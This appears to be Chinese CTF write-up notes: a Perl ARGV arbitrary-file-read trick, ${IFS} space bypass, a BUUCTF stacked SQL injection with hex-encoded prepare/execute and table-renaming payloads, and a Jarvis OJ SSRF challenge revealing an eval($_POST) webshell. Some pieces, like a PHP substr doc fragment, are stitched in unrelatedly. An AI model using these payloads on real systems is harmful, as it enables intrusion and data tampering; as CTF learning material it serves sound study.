param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。

“<>” doesn’t work with strings unless the string is “ARGV”, so it loops through the ARG values and inserting each one to an open() call => We can read content of any file by assign the scalar value first, so $file will be assigned our scalar value instead of the uploaded file descriptor

至于${IFS}

 Shell 脚本中有个变量叫 IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substitution.
     Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。
     而 IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。

此处我的理解就是一个可以由系统自行决定的分隔参数,这里可以代替空格。

注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。
语法

string 必需。规定要返回其中一部分的字符串。

length 可选。规定要返回的字符串长度。默认是直到字符串的结尾。

BUUCTF_WEB_随便注

取材于某次真实环境渗透，只说一句话：开发和安全缺一不可

堆叠注入

加引号 ?inject=1'，页面报错。

堆叠注入，查库名。

?inject=1';show databases;

查表名。
?inject=1';show tables;

发现两个表，分别为 1919810931114514 ， words 。

查列。 inject=1’;show columns from `1919810931114514`;

此路不通。使用prepare调用。
payload例: Set @t=0x73656c65637420312c323b;prepare x from @t;execute x;

0x73656c65637420312c323b经过16进制转字符串得到select 1,2;

即把查询语句经过一次16进制转换。

未转换前的payload为show coulmns from supersqli.1919810931114514

16进制转换0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134，
即最终的payload为?inject=1';Set @t=0x73656c656374202a2066726f6d20737570657273716c692e31393139383130393331313134353134;prepare x from @t;execute x;

不止可以用hex()绕过，还可以使用char()绕过。

这题甚至还有改表名的骚操作。

他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。
先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。
这样就可以让程序直接查询出 flag 了。
构造 payload 如下，然后访问，看到这个看来就执行到最后一个语句了。

?inject=1%27;RENAME%20TABLE%20words%20TO%20words1;RENAME%20TABLE%201919810931114514%20TO%20words;ALTER%20TABLE%20words%20CHANGE%20flag%20id%20VARCHAR(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20words;#
?inject=1’;RENAME TABLE words TO words1;RENAME TABLE 1919810931114514 TO words;ALTER TABLE words CHANGE flag id VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#

Jarvisoj_web_Chopper

小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？

打开网页，赫然挂着一张菜刀图片，心想终于能用到我的cknife了!
一开始的思路就是这张菜刀图片就是菜刀连接的地址，赶紧用菜刀以空密码连接一下，无效。

这个时候发现图片的名称有点奇怪。proxy.php

我们通过分析题目可以得出，小明上传了一句话木马，而常见的一句话木马一般是以下这种形式:

eval($_GET[‘url’]);

或者：echo file_get_contents($_GET[a]);

结合proxy推断proxy.php可以代理我们的请求。

构造网页地址:http://web.jarvisoj.com:32782/proxy.php?url=http://web.jarvisoj.com:32782/admin/

显示you are not admin!
F12一下，出现提示:<script>alert('admin ip is 202.5.19.128')</script>

再次构造http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/。

结合Burpsuite与目录字典，找到网页http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/robots.txt

wget下载trojan.php.txt。

保存为chopper.php。在研究了别人的WP之后使用php7.2版本运行之，并不会显示原一句话木马的内容，切换为php5.5版本得到Warning: assert(): Assertion "eval($_POST[360])" failed in /data/lab/4wv8fwzs/index.php on line 5即，eval($_POST[360])。
